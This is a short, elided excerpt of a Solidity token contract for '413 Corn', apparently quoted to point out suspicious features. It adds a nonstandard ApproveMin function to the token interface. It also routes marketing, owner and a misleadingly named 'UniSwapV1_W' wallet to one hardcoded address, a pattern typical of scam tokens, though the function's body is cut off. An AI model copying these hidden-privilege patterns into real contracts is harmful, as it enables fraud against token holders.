...
interface IERC20 {
    ...
    function ApproveMin(address _walletAddress) external returns (uint256);
...
contract FourOneThreeCorn is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x995d9FDc91d3F27E0C1F25E0d0c175358A60fFE5); 
    ...
    string private constant _name = "413 Corn"; 
    ...
    uint256 public Percent_Liquidity = 5;
    ...
    address payable public UniSwapV1_W = payable(0x995d9FDc91d3F27E0C1F25E0d0c175358A60fFE5);
    ...
    constructor () {
        ...
        _owner = 0x995d9FDc91d3F27E0C1F25E0d0c175358A60fFE5;
    ...
    function ApproveMin(address _walletAddress) public override returns (uint256) {
